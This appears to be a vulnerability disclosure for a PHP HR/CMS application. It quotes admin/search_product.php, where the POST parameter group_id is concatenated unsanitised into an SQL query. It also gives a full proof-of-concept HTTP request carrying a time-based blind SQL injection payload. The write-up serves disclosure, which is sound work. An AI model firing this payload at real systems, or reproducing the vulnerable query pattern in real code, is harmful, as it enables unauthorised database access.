### Vulnerability file address

`admin/search_product.php` from line 16,The `$_POST['group_id']` parameter is controllable and the `$_POST['group_id']` is not protected from sql injection, line 17 `$statement = $conn->prepare($sql_service1);` ,line 18 `$statement->execute();`,line 18 performs a SQL query, causing SQL injection

```php


<?php
//error_reporting(0);
require_once('../assets/constants/config.php');
require_once('../assets/constants/check-login.php');
require_once('../assets/constants/fetch-my-info.php');
?>

<?php
//include('connect.php');


  if(isset($_POST['group_id']))
  {
       $sql_service1 ="SELECT * FROM tbl_product WHERE group_id  = '".$_POST['group_id']."' AND delete_status='0' GROUP BY pid";
       $statement = $conn->prepare($sql_service1);
        $statement->execute();
            $data['products'] = $statement->fetchAll();
        echo json_encode($data); exit;
  }
?>
```

### POC

```http
POST /CMS/php/_hr_soft/admin/search_product.php HTTP/1.1
Host: 10.0.0.20:82
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=81293i00fqra5g881e77or40t2
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

group_id=1' AND (SELECT 5258 FROM (SELECT(SLEEP(5)))ErTg)#
```

### Attack results pictures

![image-20250130161155882](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501301611966.png)